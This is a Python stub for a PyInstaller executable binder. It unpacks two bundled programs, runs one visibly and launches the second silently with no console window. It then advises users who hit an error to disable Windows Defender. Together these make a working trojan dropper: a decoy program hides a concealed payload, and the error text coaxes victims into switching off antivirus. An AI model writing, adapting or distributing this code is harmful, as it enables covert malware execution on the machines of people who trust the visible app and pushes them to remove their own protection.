from tkinter import messagebox, Tk
import subprocess
import tempfile
import shutil
import json
import sys
import os

root = Tk()
root.withdraw()

if getattr(sys, 'frozen', False):
    base_path = sys._MEIPASS
else:
    exit("Please run this script as a bundled executable.")

try:
    with open(os.path.join(base_path, 'bundle_meta.json')) as f:
        meta = json.load(f)

    main = meta.get('main')
    secondary = meta.get('secondary')

    temp_exec_dir = tempfile.mkdtemp(prefix="exebundle_")
    main_path = os.path.join(temp_exec_dir, main)
    secondary_path = os.path.join(temp_exec_dir, secondary)

    shutil.copy2(os.path.join(base_path, main), main_path)
    shutil.copy2(os.path.join(base_path, secondary), secondary_path)
    
    # Main process, runs as if running directly from file explorer
    p1 = subprocess.Popen(main_path, shell=True)

    
    # Secondary process, runs silently without a console window (including ones without --noconsole from pyinstaller)
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    p2 = subprocess.Popen(
        secondary_path,
        shell=True,
        startupinfo=startupinfo,
        creationflags=subprocess.CREATE_NO_WINDOW
    )

    p1.wait()
    p2.wait()

    shutil.rmtree(temp_exec_dir, ignore_errors=True)

except Exception as e:
    messagebox.showerror("Error", "An unknown error has occurred\nYou can try disabling windows defender and running the app again.")